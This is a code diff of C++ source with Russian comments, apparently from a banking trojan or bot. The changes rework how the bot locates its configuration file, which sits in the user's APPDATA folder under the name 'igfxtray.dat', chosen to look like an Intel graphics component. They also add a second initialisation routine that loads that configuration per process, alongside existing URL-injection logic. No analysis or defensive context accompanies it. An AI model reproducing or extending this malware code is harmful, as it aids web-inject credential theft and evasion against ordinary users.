@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <shlobj.h>
 
 #include "BotConfig.h"
 #include "GetApi.h"
@@ -532,48 +533,48 @@ bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
 //----------------------------------------------------------------------------
 
 
-WCHAR ConfigFileName[MAX_PATH] = {0};
-WCHAR ConfigFileName_HP[MAX_PATH] = {0}; // Конфиг более высокого приоритета
-WCHAR BOT_CONFIG_NAME[] = {
-	'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 'd', 'a', 't', 0
-};
-WCHAR BOT_CONFIG_NAME_HP[] = {
-	'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',
-	0
-};
+char BOT_CONFIG_NAME[]    = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 'd', 'a', 't', 0};
+char BOT_CONFIG_NAME_HP[] = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',	0 };
 
-PWCHAR Config::GetFileName(bool HightPriority) {
+
+// Имя файла принудительно установленное
+char OtherConfigFileName[MAX_PATH] = "";
+
+//-----------------------------------------------------------------------------
+
+string Config::GetFileName(bool HightPriority)
+{
 	// Функция возврашает имя файла по умолчанию
-	PWCHAR FileName = NULL;
 
-	if (!HightPriority)
-		FileName = &ConfigFileName[0];
-	else
-		FileName = &ConfigFileName_HP[0];
+	// Пповеряем не установлено ли имя в ручную
+	if (!HightPriority  && !AnsiStr::IsEmpty(OtherConfigFileName))
+		return OtherConfigFileName ;
 
-	if (*FileName == 0) {
-		WCHAR *AppPath = GetShellFoldersKey(2);
+	// Собираем имя файла
+	string FileName(MAX_PATH);
 
-		if (AppPath == NULL)
-			return NULL;
+	// Определяем путь
+	pSHGetSpecialFolderPathA((HWND)NULL, FileName.t_str(), CSIDL_APPDATA, TRUE);
 
-		plstrcpyW(FileName, AppPath);
-		if (!HightPriority)
-			plstrcatW(FileName, BOT_CONFIG_NAME);
-		else
-			plstrcatW(FileName, BOT_CONFIG_NAME_HP);
+	FileName.CalcLength();
 
-		MemFree(AppPath);
-	}
-
+	if (!FileName.IsEmpty())
+	{
+		// Собираем полное имя
+		FileName += (HightPriority)? BOT_CONFIG_NAME_HP : BOT_CONFIG_NAME;
+    }
 	return FileName;
 }
 
 // ----------------------------------------------------------------------------
-void Config::SetFileName(PWCHAR FileName) {
+void Config::SetFileName(const char *FileName)
+{
 	// Функция устанавливает имя файла по умолчанию
-	// DWORD Len = m_wcslen(FileName);
-	plstrcpyW(ConfigFileName, FileName);
+	OtherConfigFileName[0] = 0;
+
+	DWORD Len = AnsiStr::Length(FileName);
+	if (Len && Len < MAX_PATH)
+		m_memcpy(OtherConfigFileName, FileName, Len + 1);
 }
 
 // ----------------------------------------------------------------------------
@@ -628,12 +629,14 @@ bool Config::Download(PCHAR URL)
 
 // ----------------------------------------------------------------------------
 
-PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
+TBotConfig* Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
 {
 	// Инициализировать настройки бота
-	if (IsNewApplication) {
+	if (IsNewApplication)
+	{
 		BotConfig = NULL;
 	}
+
 	if (BotConfig == NULL)
 	{
 		BotConfig = Create();
@@ -652,6 +655,30 @@ PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontL
 
 	return BotConfig;
 
+}
+
+// ----------------------------------------------------------------------------
+TBotConfig* Config::Initialize(PCHAR FileName)
+{
+	// Функция инициализирует глобальный класс настроек
+	if (IsNewProcess(BotConfigPID))
+	{
+    	BotConfig = NULL;
+	}
+
+	if (BotConfig == NULL)
+	{
+		// Создаём объект
+		BotConfig = new TBotConfig();
+
+		// Загружаем данные из файла
+		string FN = (STRA::IsEmpty(FileName))? NULL : FileName;
+
+		if (FN)
+            BotConfig->LoadFromFile(FileName);
+	}
+
+    return BotConfig;
 }
 
 // ----------------------------------------------------------------------------
